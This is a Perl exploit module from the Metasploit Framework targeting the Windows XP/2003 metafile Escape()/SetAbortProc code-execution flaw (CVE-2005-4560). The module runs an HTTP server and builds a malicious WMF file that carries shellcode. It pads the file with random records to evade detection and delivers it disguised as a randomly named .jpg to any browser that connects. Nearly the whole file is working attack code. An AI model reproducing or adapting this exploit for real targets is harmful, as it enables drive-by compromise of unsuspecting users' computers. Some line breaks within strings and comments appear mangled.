
##
# This file is part of the Metasploit Framework and may be
# redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the
# same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_xp_pfv_metafile;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;

my $advanced =
{
};

my $info =
{
    'Name'           => 'Windows XP/2003 Metafile Escape()
SetAbortProc Code Execution',
	'Version'        => '$Revision: 1.6 $',
'Authors'        =>
  [
'H D Moore <hdm [at] metasploit.com',
'san <san [at] xfocus.org>',
'O600KO78RUS[at]unknown.ru'
  ],

'Description'    =>
  Pex::Text::Freeform(qq{
This module exploits a vulnerability in the GDI library included with
Windows XP and 2003. This vulnerability uses the 'Escape' metafile
  function
to execute arbitrary code through the SetAbortProc procedure. This
  module
generates a random WMF record stream for each request.
}),

'Arch'           => [ 'x86' ],
'OS'             => [ 'win32', 'winxp', 'win2003' ],
'Priv'           => 0,

'UserOpts'       =>
  {
'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080
  ],
'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0"
  ],
  },

'Payload'        =>
  {
'Space'    => 1000+int(rand(1024)), # :-)
  },

'Refs'           =>
  [
  ['BID', '16074'],
['CVE', '2005-4560'],
    ['OSVDB', '21987'],
    ['MIL', '111'],
    ['URL', 'http://wvware.sourceforge.net/caolan/ora-wmf.html'],
    ['URL',
  'http://www.geocad.ru/new/site/Formats/Graphics/wmf/wmf.txt'],
      ],

    'DefaultTarget'  => 0,
    'Targets'        =>
      [
    [ 'Automatic - Windows XP / Windows 2003' ]
      ],
    
    'Keys'           => [ 'wmf' ],

    'DisclosureDate' => 'Dec 27 2005',
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info, 'Advanced' =>
				       $advanced}, @_);
    return($self);
}

sub Exploit
{
    my $self = shift;
    my $server = IO::Socket::INET->new(
				       LocalHost =>
				       $self->GetVar('HTTPHOST'),
				       LocalPort =>
				       $self->GetVar('HTTPPORT'),
				       ReuseAddr => 1,
				       Listen    => 1,
				       Proto     => 'tcp'
				       );
    my $client;

    # Did the listener create fail?
    if (not defined($server)) {
	$self->PrintLine("[-] Failed to create local HTTP listener on
    " . $self->GetVar('HTTPPORT'));
	return;
    }
    
    my $httphost = $self->GetVar('HTTPHOST');
    if ($httphost eq '0.0.0.0') {
	$httphost = Pex::Utils::SourceIP('1.2.3.4');
    }

    $self->PrintLine("[*] Waiting for connections to
    http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

    while (defined($client = $server->accept())) {
	$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
    }

    return;
}

sub HandleHttpClient
{
    my $self = shift;
    my $fd   = shift;

    my $shellcode = $self->GetVar('EncodedPayload')->Payload;

    # Push our minimum length just over the ethernet MTU
    my $pre_mlen = 1440 + rand(8192);
    my $suf_mlen = rand(8192)+128;
    
    # The number of random objects we generated
    my $fill = 0;
    
    # The buffer of random bogus objects
    my $pre_buff = "";
    my $suf_buff = "";

    while (length($pre_buff) < $pre_mlen && $fill < 65535) {
	$pre_buff .= RandomWMFRecord();
	$fill += 1;
    }

    while (length($suf_buff) < $suf_mlen && $fill < 65535) {
	$suf_buff .= RandomWMFRecord();
	$fill += 1;
    }

    my $clen = 18 + 8 + 6 + length($shellcode) + length($pre_buff) +
    length($suf_buff);
    my $content =
	#
	# WindowsMetaHeader
	#
	pack('vvvVvVv',
	     # WORD  FileType;       /* Type of metafile (0=memory,
    1=disk) */
	1,
	# WORD  HeaderSize;     /* Size of header in WORDS (always 9)
    */
	9,
	# WORD  Version;        /* Version of Microsoft Windows used
    */
	0x0300,
	# DWORD FileSize;       /* Total size of the metafile in WORDs
    */
	$clen/2,
	# WORD  NumOfObjects;   /* Number of objects in the file */
	$fill+1,
	# DWORD MaxRecordSize;  /* The size of largest record in WORDs
    */
	int(rand(64)+8),
	# WORD  NumOfParams;    /* Not Used (always 0) */
	0
	    ).
    #
    # Filler data
    #
    $pre_buff.
    #
    # StandardMetaRecord - Escape()
    #
    pack('Vvv',
	 # DWORD Size;          /* Total size of the record in WORDs
    */
	 4,
	 # WORD  Function;      /* Function number (defined in
    WINDOWS.H) */
    0xff26,                # Can also be 0x0026, 0x0626, etc...
    # WORD  Parameters[];  /* Parameter values passed to function */
    9,
    ). $shellcode .
    #
    # Filler data
    #
    $suf_buff.
    #
    # Complete the structure
    #
    pack('Vv',
    3,
    0
    );


# Set the remote host information
my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);


# Read the HTTP command
my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);


$self->PrintLine("[*] HTTP Client connected from $rhost:$rport,
sending payload...");

# Transmit the HTTP response
$fd->Send(
    "HTTP/1.0 200 OK\r\n" .
    "Content-Disposition: inline;
filename=". Pex::Text::AlphaNumText(int(rand(1024)+1)) .".jpg\r\n".
    "Content-Type: binary/octet-stream\r\n" .
    "Content-Length: " . length($content) . "\r\n" .
    "Connection: close\r\n" .
    "\r\n" .
    $content
    );

$fd->Close();
}


sub RandomWMFRecord {
    my $type = int(rand(3));

    if ($type == 0){
	# CreatePenIndirect
	return pack('Vv',
		    8,
		    0x02FA
		    ). Pex::Text::RandomData(10)
		    }
    elsif ( $type == 1 ) {
	# CreateBrushIndirect
	return pack('Vv',
		    7,
		    0x02FC
		    ). Pex::Text::RandomData(8)
		    }
    else {
	# Rectangle
	return pack('Vv',
		    7,
		    0x041B
		    ). Pex::Text::RandomData(8)
		    }
}


1;

__END__
